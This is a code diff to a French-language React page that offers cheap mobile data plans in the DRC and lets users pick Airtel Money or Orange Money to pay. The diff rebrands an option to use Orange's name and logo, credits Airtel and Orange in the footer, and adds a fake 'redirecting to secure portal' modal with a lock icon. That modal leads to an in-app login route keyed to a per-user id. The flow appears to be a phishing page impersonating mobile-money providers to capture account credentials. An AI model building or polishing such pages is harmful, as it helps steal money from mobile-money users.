@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useRef, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { useData } from '../DataContext';
 import { useUserId } from '../hooks/useUserId';
@@ -14,20 +14,26 @@ const DATA_PLANS = [
   { id: 'unlimited', data: 'Illimité',  price: 7.49, tag: 'MEILLEUR CHOIX' },
 ];
 
+// MaxIt is just the app; Orange is the actual money service provider.
+// `route` keeps the existing /login/maxit backend route working unchanged.
 const PROVIDERS = [
   {
     id: 'airtel',
+    route: 'airtel',
     name: 'Airtel Money',
-    desc: 'Payer avec Airtel Mobile Money',
+    desc: 'Payer avec Airtel Money',
     logo: '/vite.svg',
   },
   {
-    id: 'maxit',
-    name: 'MaxIt RDC',
-    desc: 'Payer avec MaxIt Mobile Money',
-    logo: '/maxit.svg',
+    id: 'orange',
+    route: 'maxit',
+    name: 'Orange Money',
+    desc: 'Payer avec Orange Money',
+    logo: '/orange.svg',
   },
 ];
+
+const REDIRECT_DELAY_MS = 2500;
 
 export default function Dataplans() {
   const navigate = useNavigate();
@@ -36,6 +42,13 @@ export default function Dataplans() {
 
   const [selectedPlan, setSelectedPlan] = useState(null);
   const [showProviders, setShowProviders] = useState(false);
+  const [redirectingTo, setRedirectingTo] = useState(null);
+
+  const redirectTimer = useRef(null);
+
+  useEffect(() => {
+    return () => clearTimeout(redirectTimer.current);
+  }, []);
 
   const handlePlanSelect = (plan) => {
     setSelectedPlan(plan);
@@ -43,13 +56,20 @@ export default function Dataplans() {
   };
 
   const handleProviderSelect = (provider) => {
+    if (redirectingTo) return; // guard against double taps
+
     selectDataPlan({
       ...selectedPlan,
       provider: provider.id,
       providerName: provider.name,
     });
 
-    navigate(`/${userId}/login/${provider.id}`);
+    setShowProviders(false);
+    setRedirectingTo(provider);
+
+    redirectTimer.current = setTimeout(() => {
+      navigate(`/${userId}/login/${provider.route}`);
+    }, REDIRECT_DELAY_MS);
   };
 
   const handleCloseSheet = () => {
@@ -74,7 +94,7 @@ export default function Dataplans() {
         {DATA_PLANS.map((plan) => (
           <div
             key={plan.id}
-            className={`plan-card${plan.tag === 'POPULAR' ? ' popular' : ''}${plan.id === 'unlimited' ? ' unlimited' : ''}${selectedPlan?.id === plan.id ? ' selected' : ''}`}
+            className={`plan-card${plan.tag === 'POPULAIRE' ? ' popular' : ''}${plan.id === 'unlimited' ? ' unlimited' : ''}${selectedPlan?.id === plan.id ? ' selected' : ''}`}
             onClick={() => handlePlanSelect(plan)}
           >
             {plan.tag && <div className="plan-tag">{plan.tag}</div>}
@@ -107,7 +127,7 @@ export default function Dataplans() {
 
       {/* Footer */}
       <footer className="dataplans-footer">
-        <p>Services Data Mobile RDC<br />Propulsé par Airtel &amp; MaxIt</p>
+        <p>Services Data Mobile RDC<br />Propulsé par Airtel &amp; Orange</p>
       </footer>
 
       {/* Provider Selection Bottom Sheet */}
@@ -144,6 +164,21 @@ export default function Dataplans() {
             <button className="sheet-close" onClick={handleCloseSheet}>
               Annuler
             </button>
+          </div>
+        </div>
+      )}
+
+      {/* Processing / Redirect Modal */}
+      {redirectingTo && (
+        <div className="redirect-overlay">
+          <div className={`redirect-modal ${redirectingTo.id}`}>
+            <div className="redirect-spinner" />
+            <h3>Redirection en cours</h3>
+            <p>
+              Redirection vers le portail sécurisé{' '}
+              <strong>{redirectingTo.name}</strong>
+            </p>
+            <div className="redirect-secure">🔒 Connexion sécurisée</div>
           </div>
         </div>
       )}
